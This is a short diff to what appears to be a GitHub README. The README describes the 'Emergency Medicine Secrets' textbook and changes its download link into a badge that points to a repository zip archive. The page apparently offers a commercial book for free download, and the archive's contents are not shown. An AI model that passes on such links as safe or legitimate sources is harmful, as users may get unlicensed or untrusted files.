@@ -4,7 +4,7 @@ For more than 30 years, the highly regarded Secrets Series® has provided studen
 Emergency Medicine Secrets offers practical, up-to-date coverage of the full range of essential topics in this dynamic field.
 This highly regarded resource features the Secrets’ popular question-and-answer format that also includes lists, tables, pearls, memory aids, and an easy-to-read style – making inquiry, reference, and review quick, easy, and enjoyable.
 
-[Download **Medical Secret Series** now](https://github.com/MedPocket/MSS/archive/main.zip).
+[![Download from GitHub](https://img.shields.io/github/repo-size/MedPocket/MSS?logo=github&label=Download)](https://github.com/MedPocket/MSS/archive/refs/heads/main.zip)
 
 ## License
 
